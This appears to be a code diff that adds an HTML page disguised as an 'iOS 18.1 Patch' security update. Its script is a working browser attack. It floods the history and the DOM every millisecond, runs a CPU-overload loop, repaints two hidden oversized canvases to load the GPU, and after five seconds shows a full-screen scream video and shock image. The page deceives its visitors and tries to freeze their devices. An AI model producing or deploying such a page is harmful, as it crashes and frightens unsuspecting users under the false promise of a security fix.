@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>iOS 18 Patch - Security Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 60px;
+    }
+    #screamer {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 9999;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔒 Installing iOS 18.1 Patch...</h1>
+  <p>Please wait. Do not close the tab.</p>
+
+  <canvas id="canvas1" style="position:absolute;left:-9999px;"></canvas>
+  <canvas id="canvas2" style="position:absolute;left:-9999px;"></canvas>
+
+  <video id="screamer" src="https://www.soundjay.com/human/sounds/scream-01.mp3" autoplay></video>
+  <img id="screamerImage" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:10000;" src="https://i.imgur.com/ydkP7Uc.jpg" />
+
+  <script>
+    // History and DOM spam
+    let i = 0;
+    setInterval(() => {
+      history.pushState({}, "", "/" + i);
+      const div = document.createElement("div");
+      div.textContent = "CRASH" + i;
+      document.body.appendChild(div);
+      i++;
+    }, 1);
+
+    // CPU overload
+    setInterval(() => {
+      for (let j = 0; j < 1e6; j++) Math.sqrt(j) * Math.random();
+    }, 1);
+
+    // GPU overload
+    function fillCanvas(id) {
+      let c = document.getElementById(id);
+      let ctx = c.getContext("2d");
+      c.width = 10000;
+      c.height = 10000;
+      setInterval(() => {
+        ctx.fillStyle = "#" + Math.floor(Math.random()*16777215).toString(16);
+        ctx.fillRect(Math.random()*10000, Math.random()*10000, 100, 100);
+      }, 5);
+    }
+    fillCanvas("canvas1");
+    fillCanvas("canvas2");
+
+    // Trigger screamer after delay
+    setTimeout(() => {
+      document.getElementById("screamer").play();
+      document.getElementById("screamerImage").style.display = "block";
+    }, 5000);
+  </script>
+
+</body>
+</html>
